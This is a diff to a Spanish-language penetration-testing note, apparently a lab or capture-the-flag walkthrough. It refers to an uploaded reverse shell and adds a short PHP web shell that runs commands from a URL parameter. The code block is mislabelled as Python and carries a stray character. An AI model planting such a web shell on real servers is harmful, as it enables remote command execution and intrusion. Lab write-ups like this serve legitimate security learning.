@@ -163,4 +163,12 @@ después de crear la reverse shell la subimos al recurso compartido y ya solo de
 #Nota debido a que esta shell no es totalmente interactiva y se pierde la conexión nada cierto tiempo vamos a realizar otro enfoque
 ![[Pasted image 20240810142207.png]]
 
+### shell
+primero que nada vamos a crear un archivo PHP que nos permita tener ejecución de comandos a través de CMD
+
+```python
+<?php
+      │     system($_GET['cmd']);
+   ?>
+```
 
